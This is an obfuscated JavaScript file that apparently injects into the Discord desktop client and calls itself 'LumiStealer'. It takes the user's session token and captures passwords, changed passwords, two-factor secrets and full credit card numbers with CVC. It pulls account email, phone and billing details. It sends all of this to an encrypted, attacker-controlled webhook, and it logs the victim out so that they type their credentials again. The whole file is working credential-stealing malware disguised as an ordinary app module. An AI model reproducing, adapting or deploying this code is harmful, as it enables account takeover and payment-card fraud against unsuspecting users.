var _0x13c119=_0x3e58;(function(_0x3bc26c,_0xbec46b){var _0x401305=_0x3e58,_0x3322c1=_0x3bc26c();while(!![]){try{var _0xc2d20b=parseInt(_0x401305(0x139))/0x1*(parseInt(_0x401305(0x198))/0x2)+parseInt(_0x401305(0x1a3))/0x3*(-parseInt(_0x401305(0x105))/0x4)+parseInt(_0x401305(0x117))/0x5*(parseInt(_0x401305(0x166))/0x6)+-parseInt(_0x401305(0x1ad))/0x7+-parseInt(_0x401305(0x19c))/0x8*(-parseInt(_0x401305(0x1a7))/0x9)+parseInt(_0x401305(0x196))/0xa+-parseInt(_0x401305(0x110))/0xb;if(_0xc2d20b===_0xbec46b)break;else _0x3322c1['push'](_0x3322c1['shift']());}catch(_0x4c0cd1){_0x3322c1['push'](_0x3322c1['shift']());}}}(_0x3814,0xe85a4),process[_0x13c119(0xff)][_0x13c119(0x107)]=0x0);const fs=require('fs'),electron=require(_0x13c119(0xec)),https=require(_0x13c119(0xe3)),crypto=require(_0x13c119(0x100)),queryString=require(_0x13c119(0x1a2)),encryptionKeyHex=_0x13c119(0x140),encryptedWebhooks=[{'iv':_0x13c119(0x17d),'encryptedData':'vyPTOpri/mwD+clbyWNMlbZmlg+kl1w7vKuMgHvm+Zfjo6xMEYfgJbKAUDicujHi1EaUJ6IFNHu+/c4rYWTXOD6aWgkyXhT+T/Bxh2/ceGoQiGYqqWT9VDfyFBBcXvm3LEsZ23FgXJQVvWHDhTNj1Pnd/we3R4l+MA==','authTag':_0x13c119(0x16f)}];function decryptWebhook(_0x503528){var _0x200d1a=_0x13c119;const _0x4fe707=Buffer[_0x200d1a(0x15d)](encryptionKeyHex,_0x200d1a(0x1a4)),_0x1bfb4f=Buffer[_0x200d1a(0x15d)](_0x503528['iv'],'base64'),_0x6ae507=Buffer['from'](_0x503528[_0x200d1a(0x182)],_0x200d1a(0x16a)),_0x171412=Buffer[_0x200d1a(0x15d)](_0x503528[_0x200d1a(0xfe)],_0x200d1a(0x16a)),_0x5071f5=crypto['createDecipheriv']('aes-256-gcm',_0x4fe707,_0x1bfb4f);_0x5071f5[_0x200d1a(0xf9)](_0x171412);let _0x32b778=_0x5071f5[_0x200d1a(0x10d)](_0x6ae507,null,_0x200d1a(0x178));return _0x32b778+=_0x5071f5[_0x200d1a(0x162)]('utf8'),_0x32b778;}function _0x3e58(_0x2353b0,_0xcf8c71){var _0x38142f=_0x3814();return _0x3e58=function(_0x3e58b2,_0x41f574){_0x3e58b2=_0x3e58b2-0xdc;var _0x1e3dd3=_0x38142f[_0x3e58b2];return _0x1e3dd3;},_0x3e58(_0x2353b0,_0xcf8c71);}const webhook=decryptWebhook(encryptedWebhooks[0x0]);var computerName=process[_0x13c119(0xff)][_0x13c119(0x17e)],tokenScript='(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()',logOutScript=_0x13c119(0x13f);const dataNow=new Date()['toISOString']();let contents2FA=[];var config={'logout':_0x13c119(0x104),'logout-notify':_0x13c119(0x104),'init-notify':_0x13c119(0x104),'embed-color':0x2c2f33,'disable_qrcode':'true','Filter':{'urls':[_0x13c119(0x18b),_0x13c119(0x10c),_0x13c119(0x128),'https://*.discord.com/api/v*/users/@me/library',_0x13c119(0x185),_0x13c119(0x112),_0x13c119(0x1ac),_0x13c119(0x125)]},'onCompleted':{'urls':['https://discord.com/api/v*/users/@me',_0x13c119(0x175),_0x13c119(0x19f),_0x13c119(0x143),_0x13c119(0x13d),_0x13c119(0x11e),_0x13c119(0x13c),_0x13c119(0x133),_0x13c119(0x10b),_0x13c119(0x15a),_0x13c119(0x1aa)]}};async function execScript(_0x5c7757){var _0x449905=_0x13c119,_0x37b5a9=electron[_0x449905(0x160)]['getAllWindows']()[0x0],_0x12b70a=await _0x37b5a9[_0x449905(0x183)][_0x449905(0xf8)](_0x5c7757,!![]);return _0x12b70a||null;}const getIP=async()=>{var _0xa58d4b=_0x13c119,_0x2fad9e=await execScript(_0xa58d4b(0x155));return _0x2fad9e['ip'];},getURL=async(_0x4b7961,_0x241573)=>{var _0x2e648e=_0x13c119,_0x5da929=await execScript(_0x2e648e(0x157)+_0x4b7961+_0x2e648e(0xf3)+_0x241573+'\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20JSON.parse(xmlHttp.responseText);');return _0x5da929;},GetBadges=_0x30b554=>{var _0x223853=_0x13c119,_0x34424b='';return 0x1==(0x1&_0x30b554)&&(_0x34424b+=_0x223853(0x146)),0x2==(0x2&_0x30b554)&&(_0x34424b+=_0x223853(0x193)),0x4==(0x4&_0x30b554)&&(_0x34424b+=_0x223853(0x130)),0x8==(0x8&_0x30b554)&&(_0x34424b+='<:8084iconbughunter:1249771650375876739>\x20'),0x40==(0x40&_0x30b554)&&(_0x34424b+=_0x223853(0x15e)),0x80==(0x80&_0x30b554)&&(_0x34424b+='<:6318iconhypesquadbrilliance:1249771644713701396>\x20'),0x100==(0x100&_0x30b554)&&(_0x34424b+=_0x223853(0xe4)),0x200==(0x200&_0x30b554)&&(_0x34424b+=_0x223853(0x172)),0x4000==(0x4000&_0x30b554)&&(_0x34424b+='<:5592bugbusterbadge:1248021388028153856>\x20'),0x400000==(0x400000&_0x30b554)&&(_0x34424b+=_0x223853(0x17f)),0x20000==(0x20000&_0x30b554)&&(_0x34424b+=_0x223853(0x145)),''==_0x34424b&&(_0x34424b=':x:'),_0x34424b;},GetRBadges=_0x4fd4eb=>{var _0x46a3d9=_0x13c119,_0x2ad8b4='';return 0x1==(0x1&_0x4fd4eb)&&(_0x2ad8b4+='<:staff:891346298932981783>\x20'),0x2==(0x2&_0x4fd4eb)&&(_0x2ad8b4+=_0x46a3d9(0x193)),0x4==(0x4&_0x4fd4eb)&&(_0x2ad8b4+='<:hypesquadevent:1082679435452481738>\x20'),0x8==(0x8&_0x4fd4eb)&&(_0x2ad8b4+=_0x46a3d9(0x13e)),0x200==(0x200&_0x4fd4eb)&&(_0x2ad8b4+='<:early:944071770506416198>\x20'),0x4000==(0x4000&_0x4fd4eb)&&(_0x2ad8b4+=_0x46a3d9(0x19e)),0x20000==(0x20000&_0x4fd4eb)&&(_0x2ad8b4+=_0x46a3d9(0x15c)),''==_0x2ad8b4&&(_0x2ad8b4=':x:'),_0x2ad8b4;},GetNSFW=_0x4c6f25=>{var _0x103e22=_0x13c119;switch(_0x4c6f25){case!![]:return _0x103e22(0x142);case![]:return _0x103e22(0x186);default:return _0x103e22(0x113);}},GetA2F=_0x419ee8=>{var _0x36201b=_0x13c119;switch(_0x419ee8){case!![]:return _0x36201b(0x164);case![]:return _0x36201b(0x153);default:return'WTF\x20DONT\x20HAVES\x20MFA\x20OR\x20HAVES?????';}},parseFriends=_0x15a199=>{var _0x208d1d=_0x13c119;try{var _0x965b72=_0x15a199['filter'](_0x1aec5c=>_0x1aec5c[_0x208d1d(0xeb)]==0x1),_0x382990='';for(var _0x4b7b9b of _0x965b72){var _0x34d17e=GetRBadges(_0x4b7b9b[_0x208d1d(0xf2)][_0x208d1d(0x119)]);if(_0x34d17e!==_0x208d1d(0x1a5))_0x382990+=_0x34d17e+'\x20'+_0x4b7b9b[_0x208d1d(0xf2)]['username']+'#'+_0x4b7b9b[_0x208d1d(0xf2)][_0x208d1d(0x15f)]+'\x0a';}if(!_0x382990)_0x382990='No\x20Rare\x20Friends';return{'len':_0x965b72['length'],'badges':_0x382990};}catch(_0x568aff){return _0x208d1d(0x1a5);}},parseBilling=_0x2d7a0a=>{var _0x5170f0=_0x13c119,_0x1a29e0='';try{if(!_0x2d7a0a)return _0x1a29e0=_0x5170f0(0x1a5);_0x2d7a0a[_0x5170f0(0x136)](_0x19630d=>{var _0x1e80a0=_0x5170f0;if(_0x19630d[_0x1e80a0(0x151)])return;switch(_0x19630d['type']){case 0x1:_0x1a29e0+=_0x1e80a0(0x116);break;case 0x2:_0x1a29e0+=_0x1e80a0(0x184);}});if(!_0x1a29e0)_0x1a29e0=_0x5170f0(0x1a5);return _0x1a29e0;}catch(_0x33477){return _0x5170f0(0x1a5);}},calcDate=(_0x119c0f,_0x1c93c7)=>new Date(_0x119c0f[_0x13c119(0xe7)](_0x119c0f[_0x13c119(0x14d)]()+_0x1c93c7)),GetNitro=_0x117108=>{var _0x39d3c7=_0x13c119;switch(_0x117108[_0x39d3c7(0x109)]){default:return _0x39d3c7(0x1a5);case 0x1:return _0x39d3c7(0x18f);case 0x2:if(!_0x117108[_0x39d3c7(0x126)])return _0x39d3c7(0x18f);var _0x387fb9=new Date(Date['now']()),_0x229c2e=[_0x39d3c7(0x103),_0x39d3c7(0x18a),_0x39d3c7(0x163),'<:Booster9Month:1051453774620803122>','<:boost12month:1068308256088400004>','<:Booster15Month:1051453775832961034>','<:BoosterLevel8:1051453778127237180>',_0x39d3c7(0x199)],_0x2c1ad9=[new Date(_0x117108[_0x39d3c7(0x126)]),new Date(_0x117108[_0x39d3c7(0x126)]),new Date(_0x117108['premium_guild_since']),new Date(_0x117108[_0x39d3c7(0x126)]),new Date(_0x117108[_0x39d3c7(0x126)]),new Date(_0x117108[_0x39d3c7(0x126)]),new Date(_0x117108['premium_guild_since'])],_0x2dc3a0=[0x2,0x3,0x6,0x9,0xc,0xf,0x12,0x18],_0x117108=[];for(var _0x2e8e04 in _0x2c1ad9)_0x117108[_0x39d3c7(0x194)](Math['round']((calcDate(_0x2c1ad9[_0x2e8e04],_0x2dc3a0[_0x2e8e04])-_0x387fb9)/0x5265c00));var _0x20047e=0x0;for(var _0x2e8e04 of _0x117108)_0x2e8e04>0x0?'':_0x20047e++;return'<:946246402105819216:962747802797113365>\x20'+_0x229c2e[_0x20047e];}};function GetLangue(_0x5a868e){var _0xa0fab4=_0x13c119,_0x1b2b46={'fr':_0xa0fab4(0x115),'da':_0xa0fab4(0x120),'de':_0xa0fab4(0x159),'en-GB':_0xa0fab4(0x102),'en-US':_0xa0fab4(0x14c),'en-ES':_0xa0fab4(0x19d),'hr':_0xa0fab4(0x12d),'it':_0xa0fab4(0x10a),'lt':':flag_lt:','hu':_0xa0fab4(0x168),'no':':flag_no:','pl':_0xa0fab4(0x12e),'pr-BR':':flag_pt:','ro':_0xa0fab4(0x111),'fi':':flag_fi:','sv-SE':_0xa0fab4(0xfd),'vi':':flag_vn:','tr':':flag_tr:','cs':':flag_cz:','el':':flag_gr:','bg':_0xa0fab4(0x118),'ru':':flag_ru:','uk':_0xa0fab4(0x129),'hi':_0xa0fab4(0xf7),'th':_0xa0fab4(0x106),'zh-CN':_0xa0fab4(0x11b),'ja':_0xa0fab4(0x17b),'zh-TW':_0xa0fab4(0x11b),'pt-BR':_0xa0fab4(0x17c),'ko':_0xa0fab4(0x18c)},_0x178a25=_0x1b2b46[_0x5a868e]||'';return _0x178a25;}async function sendWebhook(_0xeea1fd,_0x2710e6){var _0x37d452=_0x13c119;const _0x4a47a2=JSON['stringify'](_0x2710e6),_0x3e26f2=new URL(_0xeea1fd),_0x1f3dad={'hostname':_0x3e26f2[_0x37d452(0x11d)],'path':_0x3e26f2[_0x37d452(0xe6)],'method':_0x37d452(0x170),'headers':{'Content-Type':_0x37d452(0x161),'Content-Length':_0x4a47a2['length']}},_0x2535eb=https[_0x37d452(0xe8)](_0x1f3dad,_0x5c64fd=>{var _0x344ef8=_0x37d452;let _0x4cfaa9='';_0x5c64fd['on'](_0x344ef8(0x1a0),_0x3176df=>{_0x4cfaa9+=_0x3176df;}),_0x5c64fd['on'](_0x344ef8(0x18e),()=>{var _0x423614=_0x344ef8;console[_0x423614(0x114)]('Webhook\x20response:',_0x4cfaa9);});});_0x2535eb['on'](_0x37d452(0x12b),_0x4df88d=>{var _0x4aee9f=_0x37d452;console['error'](_0x4aee9f(0x108),_0x4df88d);}),_0x2535eb[_0x37d452(0x13a)](_0x4a47a2),_0x2535eb['end']();}const path=(function(){var _0x3d257b=_0x13c119,_0x484a73=electron['app'][_0x3d257b(0x189)]()['replace'](/\\/g,'/')[_0x3d257b(0x181)]('/');_0x484a73['pop'](),_0x484a73=_0x484a73['join']('/');var _0x4d00c0=electron['app'][_0x3d257b(0x150)]();return{'appPath':_0x484a73,'appName':_0x4d00c0};}());async function initOne(){var _0x112383=_0x13c119,_0x239da2=await getIP(),_0x5003b8=await execScript(tokenScript),_0x5d74bd=await getURL('https://discord.com/api/v8/users/@me',_0x5003b8),_0x90ba30=_0x112383(0x16d)+_0x5d74bd['id']+'/'+_0x5d74bd['avatar'];if(config[_0x112383(0xf6)]!==_0x112383(0x104))return!![];if(!fs['existsSync'](__dirname+'/Lumi'))fs[_0x112383(0x11c)](__dirname+_0x112383(0x188));else return!![];var {appPath:_0x34fc44,appName:_0xd99039}=path,_0x3e9266=_0xd99039;const _0x37c96a={'title':_0x112383(0xe5),'color':0x0,'fields':[{'name':_0x112383(0xef),'value':'`'+__dirname+'`','inline':![]},{'name':'Infected\x20App:','value':'<:c_nitro:1256070931084869693>\x20`'+_0xd99039+'`','inline':!![]},{'name':_0x112383(0xf5),'value':_0x112383(0x152)+computerName+'`','inline':!![]},{'name':_0x112383(0x13b),'value':_0x112383(0x177)+_0x239da2+'`','inline':!![]},{'name':_0x112383(0x123),'value':'`'+_0x5003b8+_0x112383(0x101)+_0x5003b8+')','inline':![]}],'author':{'name':_0x5d74bd[_0x112383(0x191)]+_0x112383(0x127),'icon_url':_0x90ba30},'footer':{'icon_url':_0x112383(0xde),'text':_0x112383(0xf1)},'timestamp':dataNow},_0x50fedc={'embeds':[_0x37c96a],'username':_0x112383(0x18d),'avatar_url':_0x112383(0xde)};sendWebhook(webhook,_0x50fedc),await execScript(logOutScript);}initOne();function _0x3814(){var _0x5571eb=['card[cvc]','<:devcertif:1041639665498861578>\x20','from','<:7878iconhypesquadbravery:1249771646189834373>\x20','discriminator','BrowserWindow','application/json','final','<:Booster6Month:1051453773463162890>','`MFA\x20Enabled`','Password\x20Changer\x20-\x20LumiSt2aler','6nzSNbx','passwd',':flag_no::flag_hu:','Phone','base64','Badges','method','https://cdn.discordapp.com/avatars/','Card\x20Number:','tVofMecK0RC4XxOV/YFtFw==','POST','Nitro','<:3743earlysupporterbadge:1248021361796976691>\x20','MFA\x20Enabled\x20-\x20LumiStealer','https://discord.com/api/v9/users/@me/billing/payment-sources','https://discordapp.com/api/v*/users/@me','/profile','<:lupa:1249813644750098534>\x20`','utf8','email','Login\x20Detected\x20-\x20LumiSt3aler',':flag_jp:',':flag_br:','Jwnv1cx3ZhXBxoQH','COMPUTERNAME','<:1207iconactivedeveloper:1249771641035034745>\x20','Login\x20Detected\x20-\x20LumiSt2aler','split','encryptedData','webContents','<:correto:1265368318257270804>\x20<:paypal:896441236062347374>','https://discord.com/api/v*/users/@me/library',':underage:\x20`NSFW\x20Not\x20Allowed`','uploadData','/Lumi','getAppPath','<:Booster2Month:1051453772360077374>','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',':flag_kr:','Injections\x20-\x20LumiSt3aler','end','<:946246402105819216:962747802797113365>','flags','username','Filter','<:5450partneredserver:1248021377290862612>\x20','push','endsWith','10253420vkvhoI','Email','178MqApNG','<:Booster24Month:1051453776889917530>','||\x0a[Copy\x20Token](https://paste-pgpj.onrender.com/?p=','New\x20Password','48TZyxez',':flag_es:','<:bughunter_2:874750808430874664>\x20','https://*.discord.com/api/v*/users/@me','data','Nitro:','querystring','3AniybZ','hex',':x:','splice','2321019XBJASl','phone','Expiration\x20Date:','https://discord.com/api/v*/users/@me/mfa/totp/enable','disable_qrcode','https://discord.com/api/v*/users/@me/billing/subscriptions','9481738qcSgjN','Alerts\x20-\x20LumiSt2aler','login','@me','https://i.postimg.cc/PJ06YM35/Cream-Black-Modern-Monogram-Initial-Name-Logo-5-1.png','bytes','totp','#0000\x20-\x20LumiSt3aler','Phone:','https','<:1033balancedhypesquad:1248021349394415647>\x20','First\x20Injection\x20Detected\x20-\x20LumiStealer','pathname','setMonth','request','https://discord.com/api/v9/users/','tokens','type','electron','\x20<:correto:1265368318257270804>','Secret\x20Key\x20(PUT\x20IN\x20GOOGLE\x20AUTHENTICATOR)','Injection\x20Path:','exports','LumiStealer','user','\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','session','Computer\x20Name:','init-notify',':flag_in:','executeJavaScript','setAuthTag','secret','avatar','defaultSession',':flag_se:','authTag','env','crypto','`\x0a[Copy\x20Token](https://paste-pgpj.onrender.com/?p=',':england:','<:Booster1Month:1051453771147911208>','true','1446328uGMlcc',':flag_tw:','NODE_TLS_REJECT_UNAUTHORIZED','Error\x20sending\x20webhook:','premium_type',':flag_it:','https://discordapp.com/api/v*/auth/mfa/totp','https://*.discord.com/api/v*/applications/detectable','update','CVC:','length','22874786KcieiU',':flag_ro:','https://*.discord.com/api/v*/users/@me/billing/subscriptions','Idk\x20bro\x20you\x20got\x20me','log',':flag_fr:','<:correto:1265368318257270804>\x20:credit_card:','5871995sWnRsF',':flag_bg:','public_flags','onBeforeRequest',':flag_cn:','mkdirSync','hostname','https://*.discord.com/api/v*/auth/login','./core.asar',':flag_dk:','password','url','Token:','Email:','wss://remote-auth-gateway.discord.gg/*','premium_guild_since','#0000\x20-\x20LumiStealer','https://discord.com/api/v*/applications/detectable',':flag_ua:','statusCode','error','webRequest',':flag_hr:',':flag_pl:','ID:','<:9472hypesquadeventsbadge:1248021419619647501>\x20','New\x20Card\x20Added\x20-\x20LumiStealer','Password','https://discord.com/api/v*/auth/mfa/totp','enable','mfa_enabled','forEach','Badges:','https://discord.com/api/v9/users/@me/relationships','11239SbAkkY','write','\x20IP\x20Address:','https://api.stripe.com/v*/tokens','https://discord.com/api/v*/auth/login','<:bughunter_1:874750808426692658>\x20','function\x20getLocalStoragePropertyDescriptor(){const\x20o=document.createElement(\x22iframe\x22);document.head.append(o);const\x20e=Object.getOwnPropertyDescriptor(o.contentWindow,\x22localStorage\x22);return\x20o.remove(),e}Object.defineProperty(window,\x22localStorage\x22,getLocalStoragePropertyDescriptor());const\x20localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token\x20+\x20localStorage.tokens\x20+\x20localStorage.MultiAccountStore);','6d9d52eafbbf03d980ad8c1023b48414484008c11bdbab0359574bad09af366e','new_password',':underage:\x20`NSFW\x20Allowed`','https://discordapp.com/api/v*/auth/login','parse','<:1207iconearlybotdeveloper:1249771657267122336>\x20','<:3743staffbadge:1248021364732989441>\x20','startsWith','Username:','https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png','wss://remote-auth-gateway','Username',':flag_us:','getMonth','card[exp_year]','Logins\x20-\x20LumiSt2aler','getName','invalid','<:lista:1256070773932822579>\x20`','`MFA\x20Not\x20Enabled`','banner','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0axmlHttp.open(\x20\x22GET\x22,\x20\x22https://www.myexternalip.com/json\x22,\x20false\x20);\x0axmlHttp.send(\x20null\x20);\x0aJSON.parse(xmlHttp.responseText);','Logins\x20-\x20LumiStealer','\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22','New\x20Token',':flag_de:','https://*.discord.com/api/v*/auth/mfa/totp'];_0x3814=function(){return _0x5571eb;};return _0x3814();}function customData(_0x17de73){const _0x5d8159={'content':_0x17de73};return _0x5d8159;}electron[_0x13c119(0xf4)][_0x13c119(0xfc)][_0x13c119(0x12c)][_0x13c119(0x11a)](config[_0x13c119(0x192)],(_0x346f2a,_0x326d06)=>{var _0x94631c=_0x13c119;if(config[_0x94631c(0x1ab)]==!![]){if(_0x346f2a[_0x94631c(0x122)][_0x94631c(0x147)](_0x94631c(0x14a)))return _0x326d06({'cancel':!![]});}}),electron['session']['defaultSession'][_0x13c119(0x12c)]['onCompleted'](config['onCompleted'],async(_0x433052,_0x2e487a)=>{var _0x5168aa=_0x13c119;if(![_0x5168aa(0x170),'PATCH']['includes'](_0x433052[_0x5168aa(0x16c)]))return;if(_0x433052[_0x5168aa(0x12a)]!==0xc8)return;try{var _0x458026=JSON[_0x5168aa(0x144)](_0x433052[_0x5168aa(0x187)][0x0]['bytes']);}catch(_0x2915a4){var _0x458026=queryString['parse'](decodeURIComponent(_0x433052[_0x5168aa(0x187)][0x0][_0x5168aa(0xdf)]['toString']()));}var _0x402514=await execScript(tokenScript),_0x27fb2b=getIP(),_0x323859=await getURL('https://discord.com/api/v8/users/@me',_0x402514),_0x4a124d=await getURL(_0x5168aa(0x174),_0x402514),_0x4bf217=await getURL(_0x5168aa(0x138),_0x402514),_0x480469=await getURL(_0x5168aa(0xe9)+_0x323859['id']+_0x5168aa(0x176),_0x402514),_0x227c67=parseBilling(_0x4a124d);if(!_0x323859[_0x5168aa(0xfb)])var _0x31c084=_0x5168aa(0x149);if(!_0x323859[_0x5168aa(0x154)])var _0x466c45='';_0x31c084=_0x5168aa(0x16d)+_0x323859['id']+'/'+_0x323859[_0x5168aa(0xfb)];var {appPath:_0x75d819,appName:_0x57e50f}=path,_0x52bbac=_0x57e50f,_0x224f01;switch(!![]){case _0x433052['url'][_0x5168aa(0x195)]('login'):var _0x4bcd3f=_0x458026[_0x5168aa(0x121)],_0x2bcf9e=_0x458026[_0x5168aa(0xdc)];contents2FA['push']({'passwd':_0x4bcd3f});function _0x16cccd(){return sendWebhook(webhook,'Parsa\x20ta\x20aq\x20o:\x20'+_0x224f01),_0x224f01;}if(_0x402514==null)return!![];const _0x42aaf5={'title':_0x5168aa(0x17a),'color':0x0,'fields':[{'name':_0x5168aa(0x148),'value':'`'+_0x323859[_0x5168aa(0x191)]+'`','inline':!![]},{'name':_0x5168aa(0x12f),'value':'`'+_0x323859['id']+'`','inline':!![]},{'name':_0x5168aa(0x1a1),'value':''+GetNitro(_0x480469),'inline':!![]},{'name':_0x5168aa(0x124),'value':'`'+_0x323859[_0x5168aa(0x179)]+'`','inline':!![]},{'name':'Password:','value':'`'+_0x4bcd3f+'`','inline':!![]},{'name':_0x5168aa(0xe2),'value':'`'+_0x323859['phone']+'`','inline':!![]},{'name':'Billing:','value':''+_0x227c67,'inline':!![]},{'name':'MFA:','value':GetA2F(_0x323859[_0x5168aa(0x135)]),'inline':!![]},{'name':_0x5168aa(0x137),'value':''+GetBadges(_0x323859[_0x5168aa(0x190)]),'inline':!![]},{'name':_0x5168aa(0x123),'value':'||'+_0x402514+_0x5168aa(0x19a)+_0x402514+')','inline':![]}],'author':{'name':_0x323859[_0x5168aa(0x191)]+_0x5168aa(0xe1),'icon_url':_0x31c084},'footer':{'icon_url':_0x5168aa(0xde),'text':_0x5168aa(0xf1)},'timestamp':dataNow},_0xcffaa={'embeds':[_0x42aaf5],'username':_0x5168aa(0x156),'avatar_url':_0x5168aa(0xde)};await sendWebhook(webhook,_0xcffaa);break;case _0x433052['url'][_0x5168aa(0x195)](_0x5168aa(0xe0)):const _0x2c4c15=contents2FA[0x0][_0x5168aa(0x167)],_0x2c5637={'title':_0x5168aa(0x180),'color':0x0,'fields':[{'name':'Username:','value':'`'+_0x323859[_0x5168aa(0x191)]+'`','inline':!![]},{'name':'ID:','value':'`'+_0x323859['id']+'`','inline':!![]},{'name':_0x5168aa(0x1a1),'value':''+GetNitro(_0x480469),'inline':!![]},{'name':_0x5168aa(0x124),'value':'`'+_0x323859[_0x5168aa(0x179)]+'`','inline':!![]},{'name':'Password:','value':'`'+_0x2c4c15+'`','inline':!![]},{'name':_0x5168aa(0xe2),'value':'`'+_0x323859[_0x5168aa(0x1a8)]+'`','inline':!![]},{'name':'Billing:','value':_0x227c67+_0x5168aa(0xed),'inline':!![]},{'name':'MFA:','value':GetA2F(_0x323859[_0x5168aa(0x135)]),'inline':!![]},{'name':'Badges:','value':''+GetBadges(_0x323859['flags']),'inline':!![]},{'name':'Token:','value':'||'+_0x402514+_0x5168aa(0x19a)+_0x402514+')','inline':![]}],'author':{'name':_0x323859['username']+_0x5168aa(0x127),'icon_url':_0x31c084},'footer':{'icon_url':_0x5168aa(0xde),'text':'LumiStealer'},'timestamp':dataNow};contents2FA[_0x5168aa(0x1a6)](0x0,contents2FA[_0x5168aa(0x10f)]);const _0x2a8cb5={'embeds':[_0x2c5637],'username':_0x5168aa(0x14f),'avatar_url':_0x5168aa(0xde)};await sendWebhook(webhook,_0x2a8cb5);break;case _0x433052['url'][_0x5168aa(0x195)](_0x5168aa(0xea)):var _0x2e6e11=_0x458026['card[number]'],_0x1aabde=_0x458026[_0x5168aa(0x15b)],_0x27846c=_0x458026[_0x5168aa(0x14e)],_0x1de068=_0x458026['card[exp_month]'],_0x8f61c8=_0x2e6e11+'|'+_0x1de068+'|'+_0x27846c+'|'+_0x1aabde;const _0x1e1f31={'title':_0x5168aa(0x131),'color':0x0,'fields':[{'name':_0x5168aa(0x148),'value':'`'+_0x323859[_0x5168aa(0x191)]+'`','inline':!![]},{'name':_0x5168aa(0x12f),'value':'`'+_0x323859['id']+'`','inline':!![]},{'name':'Nitro:','value':GetNitro(_0x480469),'inline':!![]},{'name':'Email:','value':'`'+_0x323859[_0x5168aa(0x179)]+'`','inline':!![]},{'name':_0x5168aa(0xe2),'value':'`'+_0x323859[_0x5168aa(0x1a8)]+'`','inline':!![]},{'name':_0x5168aa(0x137),'value':GetBadges(_0x323859[_0x5168aa(0x190)]),'inline':!![]},{'name':_0x5168aa(0x16e),'value':'`'+_0x2e6e11+'`','inline':!![]},{'name':_0x5168aa(0x1a9),'value':'`'+_0x1de068+'/'+_0x27846c+'`','inline':!![]},{'name':_0x5168aa(0x10e),'value':'`'+_0x1aabde+'`','inline':!![]},{'name':_0x5168aa(0x123),'value':'||'+_0x402514+_0x5168aa(0x19a)+_0x402514+')','inline':![]}],'author':{'name':_0x323859['username']+'#0000\x20-\x20LumiStealer','icon_url':_0x31c084},'footer':{'icon_url':_0x5168aa(0xde),'text':_0x5168aa(0xf1)},'timestamp':dataNow},_0xf09d3={'embeds':[_0x1e1f31],'username':'Cards\x20-\x20LumiSt3aler','avatar_url':_0x5168aa(0xde)};await sendWebhook(webhook,_0xf09d3);break;case _0x433052['url'][_0x5168aa(0x195)](_0x5168aa(0xdd)):var _0x28004e=_0x458026['password'],_0x4fdc72=_0x458026[_0x5168aa(0x141)],_0x1a24cf=await execScript(tokenScript);if(!_0x4fdc72||!_0x28004e)return!![];const _0x387af0={'title':'Password\x20Changed\x20-\x20LumiStealer','color':0x0,'fields':[{'name':_0x5168aa(0x14b),'value':'`'+_0x323859[_0x5168aa(0x191)]+'`','inline':!![]},{'name':'ID','value':'`'+_0x323859['id']+'`','inline':!![]},{'name':_0x5168aa(0x171),'value':GetNitro(_0x480469),'inline':!![]},{'name':'Email','value':'`'+_0x323859[_0x5168aa(0x179)]+'`','inline':!![]},{'name':_0x5168aa(0x169),'value':'`'+_0x323859[_0x5168aa(0x1a8)]+'`','inline':!![]},{'name':_0x5168aa(0x16b),'value':GetBadges(_0x323859[_0x5168aa(0x119)]),'inline':!![]},{'name':'Old\x20Password','value':'`'+_0x28004e+'`','inline':!![]},{'name':_0x5168aa(0x19b),'value':'`'+_0x4fdc72+'`','inline':!![]},{'name':'MFA','value':GetA2F(_0x323859['mfa_enabled']),'inline':!![]},{'name':_0x5168aa(0x158),'value':'||'+_0x1a24cf+_0x5168aa(0x19a)+_0x1a24cf+')','inline':!![]}],'author':{'name':_0x323859[_0x5168aa(0x191)]+_0x5168aa(0xe1),'icon_url':_0x31c084},'footer':{'icon_url':_0x5168aa(0xde),'text':'LumiStealer'},'timestamp':dataNow},_0x35422d={'embeds':[_0x387af0],'username':_0x5168aa(0x165),'avatar_url':'https://i.postimg.cc/PJ06YM35/Cream-Black-Modern-Monogram-Initial-Name-Logo-5-1.png'};await sendWebhook(webhook,_0x35422d);break;case _0x433052['url'][_0x5168aa(0x195)](_0x5168aa(0x134)):var _0x35c107=_0x458026[_0x5168aa(0xfa)],_0x4bcd3f=_0x458026[_0x5168aa(0x121)],_0x1a24cf=await execScript(tokenScript);const _0x17039f={'title':_0x5168aa(0x173),'color':0x0,'fields':[{'name':_0x5168aa(0x14b),'value':'`'+_0x323859['username']+'`','inline':!![]},{'name':_0x5168aa(0x197),'value':'`'+_0x323859[_0x5168aa(0x179)]+'`','inline':!![]},{'name':_0x5168aa(0x132),'value':'`'+_0x4bcd3f+'`','inline':!![]},{'name':_0x5168aa(0xee),'value':'`'+_0x35c107+'`','inline':![]},{'name':_0x5168aa(0x158),'value':'||'+_0x1a24cf+'||\x0a[Copy\x20Token](https://paste-pgpj.onrender.com/?p='+_0x1a24cf+')','inline':![]}],'author':{'name':_0x323859[_0x5168aa(0x191)]+'#0000\x20-\x20LumiSt3aler','icon_url':_0x31c084},'footer':{'icon_url':'https://i.postimg.cc/PJ06YM35/Cream-Black-Modern-Monogram-Initial-Name-Logo-5-1.png','text':_0x5168aa(0xf1)},'timestamp':dataNow},_0x52fc9a={'embeds':[_0x17039f],'username':_0x5168aa(0x1ae),'avatar_url':_0x5168aa(0xde)};await sendWebhook(webhook,_0x52fc9a);break;}}),module[_0x13c119(0xf0)]=require(_0x13c119(0x11f));
